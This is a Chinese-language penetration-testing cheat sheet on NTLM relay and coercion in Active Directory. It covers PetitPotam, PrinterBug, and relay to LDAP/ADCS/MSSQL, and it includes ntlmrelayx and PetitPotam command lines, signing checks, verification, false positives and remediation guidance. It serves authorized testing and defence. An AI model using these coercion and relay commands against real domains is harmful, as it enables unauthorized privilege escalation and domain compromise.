# NTLM 中继与强制认证（Coercion）

> 中继 = "把一次认证转发给另一个服务"。成败取决于两点：**能否拿到认证**（投毒/强制）与**目标是否不校验来源**（签名/EPA/绑定关闭）。

## 一、获取认证（Coercion）

| 方法 | 协议 | 备注 |
|---|---|---|
| LLMNR/NBT-NS/mDNS 投毒 | 广播 | Responder；等待自动化访问（比如用户输错共享名） |
| WPAD 投毒 | 广播/DNS | 常用于钓鱼文档触发 |
| PetitPotam | MS-EFSRPC（`EfsRpcOpenFileRaw`） | 强制域控向指定主机认证 |
| PrinterBug | MS-RPRN（`RpcRemoteFindFirstPrinterChangeNotificationEx`） | 经典，许多补丁后的环境仍可用 |
| DFSCoerce | MS-DFSNM | 变体 |
| ShadowCoerce | MS-FSRVP | 变体 |
| CoercedPotato/远程触发链 | 多种 | 组合使用 |

```bash
# 触发 + 中继典型编排
ntlmrelayx.py -t ldap://<dc> --delegate-access
python3 PetitPotam.py <attacker-ip> <target-ip>
```

## 二、中继目标与条件

| 目标 | 条件 | 效果 |
|---|---|---|
| SMB | 目标未强制 SMB 签名 | 会话/命令执行（若中继到的账号是本地管理员） |
| LDAP/LDAPS | 未强制 LDAP 签名、未启用通道绑定 | 创建机器账号、写 RBCD、改属性、DCSync（若中继到高权账号） |
| HTTP（ADCS Web 注册） | EPA 未启用 | 为被中继账号申请证书（ESC8） |
| MSSQL | 未强制加密 | `EXECUTE AS`、系统命令 |
| RPC（ICertPassage/EFSRPC） | 接口未强制加密 | 证书注册（ESC11）、触发链条 |

关键判断命令：

```bash
netexec smb <cidr>                      # 看 (signing:True/False)
netexec ldap <dc>                       # 看 (signing:None/...) 与通道绑定
netexec ldaps <dc>                      # 检查 LDAP over TLS 通道绑定
```

## 三、跨协议与绕过

- **WebDAV/HTTP 到 SMB**：`\\attacker@80\file` 类 UNC 路径可强制 HTTP 认证（便于跨网段），常与钓鱼文档配合。
- **IPv6 优先**：伪造 DHCPv6/DNS 让目标走 IPv6（mitm6），获取更多认证。
- **中继到 LDAPS**：即使 LDAP 明文签名开启，LDAPS 可能仍是弱配置。
- **多中继**：一次 ntlmlrelayx 同时挂多个目标，命中哪个用哪个。
- **SMB→LDAP→ADCS** 链：先中继拿机器账号，再用其转 RBCD/证书。
- **保护绕过无效时的转向**：如果 SMB 与 LDAP 都强制签名，尝试 ADCS Web 注册、MSSQL、RPC 接口。

## 四、验证（最小证据）

1. 认证被捕获的证据：Responder/ntlmrelayx 日志中的 challenge-response（含来源 IP 与账号）。
2. 中继成功的证据：目标侧操作成功（如 LDAP 新增对象、SMB 会话建立、证书签发返回）。
3. 影响证明：用中继得到的权限做**只读**动作（列目录、读属性）。
4. 记录"哪个目标未强制签名/绑定"，这是缺陷本体。

## 五、常见误报

- 收到认证但所有目标都强制签名 → 只能离线破解，不是中继成功。
- 中继成功但账号权限极低（无实质影响）。
- 收到的 challenge 来自我们自己的测试机回环。
- EPA/通道绑定开启导致证书申请失败。

## 六、修复

- 强制 **SMB 签名**与 **LDAP 签名 + 通道绑定**（域控上）；对 LDAPS 也启用通道绑定。
- 禁用 LLMNR/NBT-NS/WPAD/mDNS（或按需）。
- 域控开启 **EPA**，限制 ADCS Web 注册。
- 限制机器账号创建（`MachineAccountQuota=0`），保护高权账号不能登录普通主机（Tier 模型）。
- 监控：4624 类型 3 的异常来源、`Security` 日志 4768/4769、ADCS 4886/4887、LDAP 修改事件（5136）。

## 七、参考

- HackTricks：Spoofing LLMNR/NBT-NS/mDNS/DNS/WPAD 与 Relay Attack
- PetitPotam / DFSCoerce / ShadowCoerce 原始研究
- 工具：Responder、ntlmrelayx、mitm6、netexec
